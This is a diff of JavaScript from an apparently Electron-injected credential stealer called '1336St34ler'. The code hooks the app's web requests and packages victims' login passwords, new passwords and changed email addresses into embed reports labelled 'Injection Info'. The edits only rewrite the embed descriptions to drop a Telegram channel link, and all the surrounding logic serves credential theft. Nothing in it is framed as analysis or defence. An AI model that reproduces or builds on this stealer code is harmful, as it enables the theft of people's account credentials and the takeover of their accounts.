@@ -517,7 +517,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var password = data.password
             var params = await makeEmbed({
                 title: "1336St34ler User Login",
-                description: "[${info.username}'s account](https://t.me/St34ler)",
+                description: `${info.username}'s account`,
                 color: config['embed-color'],
                 fields: [{
                     name: "Injection Info",
@@ -582,7 +582,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (data.new_password) {
                 var params = await makeEmbed({
                     title: "1336 Detect Password Changed",
-                    description: "[${info.username}'s account](https://t.me/St34ler)",
+                    description: `${info.username}'s account`,
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -653,7 +653,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (data.email) {
                 var params = await makeEmbed({
                     title: "1336 Detect Email Changed",
-                    description: "[${user.username}'s account](https://t.me/St34ler)",
+                    description: `${user.username}'s account`,
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
